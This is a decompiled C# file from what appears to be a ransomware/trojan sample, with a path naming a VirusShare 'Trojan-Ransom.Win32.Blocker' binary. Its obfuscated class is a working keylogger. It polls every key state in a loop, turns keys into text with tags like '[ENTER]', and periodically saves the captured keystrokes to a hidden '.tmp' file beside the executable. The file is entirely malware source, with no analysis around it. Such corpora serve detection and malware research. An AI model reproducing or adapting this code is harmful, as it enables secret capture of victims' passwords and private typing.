// Decompiled with JetBrains decompiler
// Type: .
// Assembly: w, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8101C3F8-A792-4EB9-952B-26F7AB9A4B5A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\HEUR-Trojan-Ransom.Win32.Blocker.vho-bc21886ff5fa061490673a734a0fae648503560d8ff26be6ac862202b96b7ef0.exe

using \u0004;
using \u0006;
using \u0007;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace \u0007
{
  internal class \u0001
  {
    internal int \u0001;
    internal string \u0001;
    private Keys \u0001;
    public Clock \u0001;
    public string \u0002;
    private object \u0001;
    public string \u0003;
    [NonSerialized]
    internal static \u0001 \u009F;

    public \u0001()
    {
      char[] chArray1;
      try
      {
        this.\u0001 = Keys.None;
        this.\u0001 = new Clock();
        this.\u0002 = \u0001.\u009F(269);
        this.\u0001 = (object) new Keyboard();
        string location = Assembly.GetExecutingAssembly().Location;
        chArray1 = new char[4]{ '.', 't', 'm', 'p' };
        string str = new string(chArray1);
        this.\u0003 = location + str;
      }
      catch (Exception ex)
      {
        char[] chArray2 = chArray1;
        \u0006.\u0007.\u0001(ex, (object) chArray2, (object) this);
        throw;
      }
    }

    private string \u0001([In] Keys obj0)
    {
      bool flag;
      Keys keys;
      string str1;
      char[] chArray1;
      Exception exception1;
      char ch;
      try
      {
        flag = \u000F.\u0018(\u0001.\u0001(this.\u0001, (System.Type) null, \u0001.\u009F(631), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
        if (global::\u0007.\u000F(\u0001.\u0001(this.\u0001, (System.Type) null, \u0001.\u009F(648), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) true, false))
          flag = !flag;
        try
        {
          keys = obj0;
          if (keys == Keys.F1 || keys == Keys.F2 || keys == Keys.F3 || keys == Keys.F4 || keys == Keys.F5 || keys == Keys.F6 || keys == Keys.F7 || keys == Keys.F8 || keys == Keys.F9 || keys == Keys.F10 || keys == Keys.F11 || keys == Keys.F12 || keys == Keys.End || keys == Keys.Delete || keys == Keys.Back)
            str1 = global::\u0004.\u0004(\u0001.\u009F(661), obj0.ToString(), \u0001.\u009F(666));
          else if (keys == Keys.LShiftKey || keys == Keys.RShiftKey || keys == Keys.Shift || keys == Keys.ShiftKey || keys == Keys.Control || keys == Keys.ControlKey || keys == Keys.RControlKey || keys == Keys.LControlKey || keys == Keys.Alt)
            str1 = \u0001.\u009F(269);
          else if (keys == Keys.Space)
          {
            chArray1 = new char[1]{ ' ' };
            str1 = new string(chArray1);
          }
          else if (keys == Keys.Return || keys == Keys.Return)
          {
            \u0015 obj = \u0015.\u007E\u001F;
            string str2 = this.\u0002;
            chArray1 = new char[7]
            {
              '[',
              'E',
              'N',
              'T',
              'E',
              'R',
              ']'
            };
            string str3 = \u001D.\u0099(new string(chArray1), \u0001.\u009F(671));
            if (obj((object) str2, str3))
            {
              str1 = \u0001.\u009F(269);
            }
            else
            {
              chArray1 = new char[7]
              {
                '[',
                'E',
                'N',
                'T',
                'E',
                'R',
                ']'
              };
              str1 = \u001D.\u0099(new string(chArray1), \u0001.\u009F(671));
            }
          }
          else if (keys == Keys.Tab)
          {
            if (true)
            {
              chArray1 = new char[5]
              {
                '[',
                'T',
                'A',
                'P',
                ']'
              };
              str1 = \u001D.\u0099(new string(chArray1), \u0001.\u009F(671));
            }
          }
          else
            str1 = !flag ? \u0006.\u0007.\u0001(checked ((uint) obj0)) : \u001E.\u007E\u009B((object) \u0006.\u0007.\u0001(checked ((uint) obj0)));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception1 = ex;
          int num;
          for (int index = flag ? 1 : 0; index == 0; index = num)
          {
            num = (int) \u001F.\u0018\u0002((int) obj0);
            if (true)
            {
              ch = (char) num;
              str1 = \u001E.\u007E\u009C((object) ch.ToString());
              global::\u0006.\u0006();
              goto label_21;
            }
          }
          ch = \u001F.\u0018\u0002((int) obj0);
          str1 = \u001E.\u007E\u009B((object) ch.ToString());
          global::\u0006.\u0006();
        }
label_21:
        return str1;
      }
      catch (Exception ex)
      {
        string str4 = str1;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local1 = (ValueType) flag;
        Exception exception2 = exception1;
        // ISSUE: variable of a boxed type
        __Boxed<Keys> local2 = (Enum) keys;
        char[] chArray2 = chArray1;
        // ISSUE: variable of a boxed type
        __Boxed<char> local3 = (ValueType) ch;
        // ISSUE: variable of a boxed type
        __Boxed<Keys> local4 = (Enum) obj0;
        \u0006.\u0007.\u0001(ex, (object) str4, (object) local1, (object) exception2, (object) local2, (object) chArray2, (object) local3, (object) this, (object) local4);
        throw;
      }
    }

    public unsafe void \u0001()
    {
      if (false)
        return;
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      Exception exception1;
      Keys keys;
      string str1;
      Exception exception2;
      try
      {
        try
        {
          this.\u0002 = \u007F.\u0019\u0002(this.\u0003);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception1 = ex;
          global::\u0006.\u0006();
        }
        try
        {
          *(int*) voidPtr = 0;
          while (true)
          {
            *(int*) voidPtr = checked (*(int*) voidPtr + 1);
            *(int*) ((IntPtr) voidPtr + 4) = 0;
            do
            {
              if (\u0006.\u0007.\u0001(*(int*) ((IntPtr) voidPtr + 4)) == (short) -32767)
              {
                keys = (Keys) *(int*) ((IntPtr) voidPtr + 4);
                str1 = this.\u0001(keys);
                if (\u0018.\u007E\u0084((object) str1) > 0)
                {
                  this.\u0002 = \u001D.\u0099(this.\u0002, \u0006.\u0007.\u0001(this));
                  this.\u0002 = \u001D.\u0099(this.\u0002, str1);
                }
                this.\u0001 = keys;
              }
              *(int*) ((IntPtr) voidPtr + 4) = checked (*(int*) unchecked ((IntPtr) voidPtr + 4) + 1);
            }
            while (*(int*) ((IntPtr) voidPtr + 4) <= (int) byte.MaxValue);
            if (*(int*) voidPtr == 1000)
            {
              *(int*) voidPtr = 0;
              *(int*) ((IntPtr) voidPtr + 8) = 20480;
              if (\u0018.\u007E\u0084((object) this.\u0002) > *(int*) ((IntPtr) voidPtr + 8))
                this.\u0002 = \u0080.\u007E\u001D\u0002((object) this.\u0002, 0, checked (\u0018.\u007E\u0084((object) this.\u0002) - *(int*) unchecked ((IntPtr) voidPtr + 8)));
              \u0081.\u001F\u0002(this.\u0003, this.\u0002);
            }
            \u001A.\u0095(1);
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception2 = ex;
          global::\u0006.\u0006();
        }
      }
      catch (Exception ex)
      {
        Exception exception3 = exception1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<Keys> local3 = (Enum) keys;
        string str2 = str1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        Exception exception4 = exception2;
        \u0006.\u0007.\u0001(ex, (object) exception3, (object) local1, (object) local2, (object) local3, (object) str2, (object) local4, (object) exception4, (object) this);
        throw;
      }
    }

    static \u0001() => \u0002.\u0001(typeof (\u0001));
  }
}
